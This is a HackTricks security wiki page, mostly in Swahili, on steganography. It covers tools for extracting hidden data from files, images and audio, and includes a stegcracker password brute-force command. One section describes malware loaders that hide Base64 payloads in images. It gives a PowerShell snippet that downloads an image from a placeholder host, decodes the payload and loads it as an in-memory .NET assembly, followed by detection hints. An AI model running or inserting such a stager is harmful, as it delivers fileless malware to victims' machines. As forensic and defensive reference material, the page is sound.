# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Kutoa Data kutoka kwa Faili**

### **Binwalk**

Chombo cha kutafuta faili za binary kwa ajili ya faili na data zilizofichwa zilizomo ndani. Imewekwa kupitia `apt` na chanzo chake kinapatikana kwenye [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Inarejesha faili kwa kuzingatia headers na footers zao; inafaa kwa picha za png. Imewekwa kupitia `apt` na chanzo chake kipo kwenye [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Husaidia kuona metadata ya faili, inapatikana [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Inafanana na exiftool, kwa kuangalia metadata. Inayoweza kusakinishwa kupitia `apt`, chanzo kwenye [GitHub](https://github.com/Exiv2/exiv2), na ina [tovuti rasmi](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **Faili**

Tambua aina ya faili unayoshughulikia.

### **Strings**

Inatoa strings zinazosomeka kutoka kwa mafaili, ikitumia mipangilio mbalimbali ya encoding kuchuja matokeo.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

Inafaa kwa kulinganisha faili iliyobadilishwa na toleo lake la awali lililopatikana mtandaoni.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Kuchota Data Iliyofichwa katika Maandishi**

### **Data Iliyofichwa katika Nafasi**

Vibonye visivyoonekana katika nafasi zinazofikiriwa kuwa tupu vinaweza kuficha taarifa. Ili kuchota data hii, tembelea [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Kuchota Data kutoka kwa Picha**

### **Kutambua Maelezo ya Picha kwa kutumia GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) husaidia kubaini aina za faili za picha na kutambua uharibifu unaoweza kuwepo. Tekeleza amri ifuatayo ili kuchunguza picha:
```bash
./magick identify -verbose stego.jpg
```
Ili kujaribu kurekebisha picha iliyoharibika, kuongeza maoni ya metadata kunaweza kusaidia:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide kwa Kuficha Data**

Steghide inaruhusu kuficha data ndani ya faili za `JPEG, BMP, WAV, and AU`, na inaweza kuingiza na kutoa data iliyosimbwa. Ufungaji ni rahisi kwa kutumia `apt`, na [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).

**Amri:**

- `steghide info file` inaonyesha kama faili ina data iliyofichwa.
- `steghide extract -sf file [--passphrase password]` hutoa data iliyofichwa; nenosiri ni hiari.

Kwa uondoaji mtandaoni, tembelea [this website](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- Ili kujaribu password cracking kwenye Steghide, tumia [stegcracker](https://github.com/Paradoxis/StegCracker.git) kama ifuatavyo:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg kwa Faili za PNG na BMP**

zsteg inalenga kugundua data iliyofichwa katika faili za PNG na BMP. Usanidi unafanywa kupitia `gem install zsteg`, na chanzo chake kiko kwenye [GitHub](https://github.com/zed-0xff/zsteg).

**Amri:**

- `zsteg -a file` inatumia mbinu zote za ugunduzi kwenye faili.
- `zsteg -E file` inaainisha payload kwa uondoaji wa data.

### **StegoVeritas na Stegsolve**

**stegoVeritas** hukagua metadata, hutekeleza mabadiliko ya picha, na hutumia LSB brute forcing miongoni mwa vipengele vingine. Tumia `stegoveritas.py -h` kwa orodha kamili ya chaguzi na `stegoveritas.py stego.jpg` kutekeleza ukaguzi wote.

**Stegsolve** hutumia vichujio mbalimbali vya rangi kufichua maandishi au ujumbe vilivyofichwa ndani ya picha. Inapatikana kwenye [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT kwa Ugunduzi wa Yaliyofichwa**

Fast Fourier Transform (FFT) techniques zinaweza kufichua yaliyofichwa katika picha. Rasilimali zenye msaada ni pamoja na:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy kwa Faili za Sauti na Picha**

Stegpy inaruhusu kuingiza taarifa ndani ya faili za picha na sauti, ikiunga mkono fomati kama PNG, BMP, GIF, WebP, na WAV. Inapatikana kwenye [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck kwa Uchambuzi wa Faili za PNG**

Kuchambua faili za PNG au kuthibitisha uhalali wao, tumia:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Zana Za Ziada za Uchambuzi wa Picha**

For further exploration, consider visiting:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Marker-delimited Base64 payloads hidden in images (malware delivery)

Commodity loaders kwa wingi huweka kwa siri Base64-encoded payloads kama plain text ndani ya picha ambazo vinginevyo ni halali (mara nyingi GIF/PNG). Badala ya pixel-level LSB, the payload imegawwa kwa unique start/end marker strings zilizowekwa ndani ya file text/metadata. Kisha, PowerShell stager hufanya:

- Inapakua the image kupitia HTTP(S)
- Inatafuta the marker strings (mifano iliyoshuhudiwa: <<sudo_png>> … <<sudo_odt>>)
- Inatoa the between-text na kisha hufanya Base64-decode kuwa bytes
- Inapakia the .NET assembly in-memory na inaitisha known entry method (hakuna file inayowekwa kwenye disk)

Minimal PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Vidokezo
- Hii inapatikana chini ya ATT&CK T1027.003 (steganography). Mfululizo wa alama hutofautiana kati ya kampeni.
- Uchunguzi: skana picha zilizopakuliwa kwa delimiters zinazojulikana; taja `PowerShell` inayotumia `DownloadString` ikifuatiwa na `FromBase64String`.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Kutoa Data kutoka kwa Mafaili ya Sauti**

**Audio steganography** inatoa njia ya kipekee ya kuficha taarifa ndani ya mafaili ya sauti. Zana mbalimbali zinatumiwa kwa kuingiza au kupata maudhui yaliyofichwa.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide ni zana yenye matumizi mengi iliyoundwa kwa kuficha data katika faili za JPEG, BMP, WAV, na AU. Maelekezo ya kina yapo katika the [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Zana hii inafaa kwa fomati mbalimbali ikiwemo PNG, BMP, GIF, WebP, na WAV. Kwa taarifa zaidi, rejea kwa [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

ffmpeg ni muhimu kwa kutathmini uadilifu wa mafaili ya sauti, ikitoa taarifa za kina na kuonyesha tofauti yoyote.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg ni hodari kuficha na kutoa data ndani ya faili za WAV kwa kutumia mbinu ya least significant bit. Inapatikana kwenye [GitHub](https://github.com/ragibson/Steganography#WavSteg). Amri ni pamoja na:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound inaruhusu usimbaji na utambuzi wa taarifa ndani ya faili za sauti kwa kutumia AES-256. Inaweza kupakuliwa kutoka [the official page](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Zana muhimu kwa ukaguzi wa kuona na uchambuzi wa faili za sauti, Sonic Visualizer inaweza kufichua vipengele vilivyofichika ambavyo havionekani kwa njia nyingine. Tembelea [official website](https://www.sonicvisualiser.org/) kwa habari zaidi.

### **DTMF Tones - Dial Tones**

Kugundua toni za DTMF katika faili za sauti kunaweza kufanywa kwa kutumia zana za mtandaoni kama [this DTMF detector](https://unframework.github.io/dtmf-detect/) na [DialABC](http://dialabc.com/sound/detect/index.html).

## **Mbinu Nyingine**

### **Binary Length SQRT - QR Code**

Data za binary ambazo mzizi wa mraba wa urefu wake ni nambari kamili zinaweza kuwakilisha QR code. Tumia kifungu hiki kuangalia:
```python
import math
math.sqrt(2500) #50
```
Kwa kubadilisha binary kuwa picha, angalia [dcode](https://www.dcode.fr/binary-image). Ili kusoma QR codes, tumia [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Tafsiri ya Braille**

Kwa kutafsiri Braille, [Branah Braille Translator](https://www.branah.com/braille-translator) ni rasilimali bora.

## **Marejeo**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
